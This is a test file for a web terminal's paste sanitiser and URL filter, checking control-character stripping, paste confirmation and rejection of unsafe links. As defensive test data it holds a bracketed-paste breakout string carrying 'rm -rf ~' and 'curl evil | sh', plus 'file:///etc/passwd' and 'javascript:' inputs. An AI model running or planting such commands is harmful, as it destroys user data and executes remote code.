import { describe, expect, it, vi } from "vitest";
import { findUrls, isOpenableUrl } from "./links";
import { createPasteListener, needsPasteConfirm, pasteLineCount, sanitizePaste } from "./paste";

const ESC = String.fromCharCode(0x1b);
const CSI8 = String.fromCharCode(0x9b);

describe("sanitizePaste (§8.6, §9.5)", () => {
  it("strips ESC so a bracketed-paste end marker cannot break out", () => {
    const evil = `rm -rf ~${ESC}[201~; curl evil | sh`;
    const clean = sanitizePaste(evil);
    expect(clean).not.toContain(ESC);
    expect(clean).toBe("rm -rf ~[201~; curl evil | sh");
  });

  it("strips the single-byte CSI (0x9B) and other C1 controls", () => {
    expect(sanitizePaste(`a${CSI8}201~b${String.fromCharCode(0x85)}c`)).toBe("a201~bc");
  });

  it("strips NUL, BEL, BS, DEL and other C0 controls but keeps TAB, LF and CR", () => {
    const controls = [0, 7, 8, 0x0b, 0x0c, 0x0e, 0x1a, 0x7f].map((c) => String.fromCharCode(c)).join("");
    expect(sanitizePaste(`x${controls}y`)).toBe("xy");
    expect(sanitizePaste("a\tb\r\nc\nd\re")).toBe("a\tb\r\nc\nd\re");
  });

  it("keeps ordinary Unicode (surrogate pairs, CJK, combining marks)", () => {
    const text = "grüße 日本語 😀 é";
    expect(sanitizePaste(text)).toBe(text);
  });
});

describe("multi-line paste confirm", () => {
  it("counts lines; a trailing line break does not add one", () => {
    expect(pasteLineCount("")).toBe(0);
    expect(pasteLineCount("one")).toBe(1);
    expect(pasteLineCount("a\nb\r\nc")).toBe(3);
    expect(pasteLineCount("a\nb\n")).toBe(2);
  });

  it("asks only without bracketed-paste mode and only when there is a newline", () => {
    expect(needsPasteConfirm("a\nb", false)).toBe(true);
    expect(needsPasteConfirm("a\rb", false)).toBe(true);
    expect(needsPasteConfirm("a\nb", true)).toBe(false);
    expect(needsPasteConfirm("single line", false)).toBe(false);
  });
});

function pasteEvent(text: string): ClipboardEvent {
  const event = new Event("paste", { bubbles: true, cancelable: true });
  Object.defineProperty(event, "clipboardData", { value: { getData: (type: string) => (type === "text/plain" ? text : "") } });
  return event as ClipboardEvent;
}

describe("createPasteListener", () => {
  const make = (over: Partial<Parameters<typeof createPasteListener>[0]> = {}) => {
    const target = {
      paste: vi.fn<(text: string) => void>(),
      bracketedPasteMode: () => true,
      acceptsInput: () => true,
      confirm: vi.fn<(text: string) => Promise<boolean>>(async () => true),
      ...over,
    };
    return { target, listener: createPasteListener(target) };
  };

  it("cancels the event, stops propagation and pastes sanitised text once", () => {
    const { target, listener } = make();
    const event = pasteEvent(`ls${ESC}[201~ -la`);
    const stop = vi.spyOn(event, "stopImmediatePropagation");
    listener(event);
    expect(event.defaultPrevented).toBe(true);
    expect(stop).toHaveBeenCalled();
    expect(target.paste).toHaveBeenCalledTimes(1);
    expect(target.paste).toHaveBeenCalledWith("ls[201~ -la");
  });

  it("pastes multi-line text directly in bracketed-paste mode", () => {
    const { target, listener } = make();
    listener(pasteEvent("a\nb"));
    expect(target.confirm).not.toHaveBeenCalled();
    expect(target.paste).toHaveBeenCalledWith("a\nb");
  });

  it("confirms multi-line text outside bracketed-paste mode and respects Cancel", async () => {
    const decline = make({ bracketedPasteMode: () => false, confirm: vi.fn(async () => false) });
    decline.listener(pasteEvent("a\nb"));
    await Promise.resolve();
    await Promise.resolve();
    expect(decline.target.confirm).toHaveBeenCalledWith("a\nb");
    expect(decline.target.paste).not.toHaveBeenCalled();

    const accept = make({ bracketedPasteMode: () => false });
    accept.listener(pasteEvent("a\nb"));
    await vi.waitFor(() => expect(accept.target.paste).toHaveBeenCalledWith("a\nb"));
  });

  it("does nothing (but still swallows the event) while the terminal does not accept input", () => {
    const { target, listener } = make({ acceptsInput: () => false });
    const event = pasteEvent("x");
    listener(event);
    expect(event.defaultPrevented).toBe(true);
    expect(target.paste).not.toHaveBeenCalled();
  });

  it("ignores a paste that is empty after sanitising", () => {
    const { target, listener } = make();
    listener(pasteEvent(`${ESC}${ESC}`));
    expect(target.paste).not.toHaveBeenCalled();
  });
});

describe("findUrls / isOpenableUrl (§8.6 link provider)", () => {
  it("finds http(s) URLs and drops trailing punctuation", () => {
    expect(findUrls("see https://example.com/docs?lang=en.").map((f) => f.url)).toEqual([
      "https://example.com/docs?lang=en",
    ]);
    expect(findUrls("(https://example.com/a_(b)) and http://example.org, ok").map((f) => f.url)).toEqual([
      "https://example.com/a_(b)",
      "http://example.org",
    ]);
  });

  it("reports the index range of the URL", () => {
    const [found] = findUrls("go to https://example.com/x now");
    expect(found).toMatchObject({ url: "https://example.com/x", start: 6, end: 27 });
  });

  it("never offers non-http schemes, credentials or over-long URLs", () => {
    expect(findUrls("ftp://example.com file:///etc/passwd javascript:alert(1)")).toEqual([]);
    expect(isOpenableUrl("https://user:pw@example.com/")).toBe(false);
    expect(isOpenableUrl("https://example.com/")).toBe(true);
    expect(isOpenableUrl(`https://example.com/${"a".repeat(2100)}`)).toBe(false);
    expect(isOpenableUrl("not a url")).toBe(false);
  });
});
